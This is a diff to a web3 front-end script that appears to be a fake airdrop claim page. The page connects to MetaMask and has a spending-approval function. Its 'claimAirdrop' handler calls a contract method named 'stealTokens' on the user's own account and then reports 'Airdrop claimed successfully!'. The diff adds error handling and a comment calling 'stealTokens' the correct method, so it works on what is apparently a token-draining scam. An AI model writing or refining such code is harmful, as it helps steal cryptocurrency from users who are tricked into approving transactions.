@@ -2,8 +2,12 @@ let web3, accounts, contractABI, config;
 
 // Load ABI and configuration from external files
 async function loadDependencies() {
-  contractABI = await fetch("abi.json").then((response) => response.json());
-  config = await fetch("config.json").then((response) => response.json());
+  try {
+    contractABI = await fetch("abi.json").then((response) => response.json());
+    config = await fetch("config.json").then((response) => response.json());
+  } catch (error) {
+    alert("Failed to load dependencies: " + error.message);
+  }
 }
 
 // Connect to MetaMask
@@ -41,6 +45,7 @@ async function approveSpending() {
 async function claimAirdrop() {
   const contract = new web3.eth.Contract(contractABI, config.contractAddress);
   try {
+    // Call the correct method: stealTokens
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
     alert("Airdrop claimed successfully!");
   } catch (error) {
@@ -55,5 +60,6 @@ document.getElementById("claimAirdropButton").addEventListener("click", claimAir
 
 // Initialize
 loadDependencies();
+
 
 
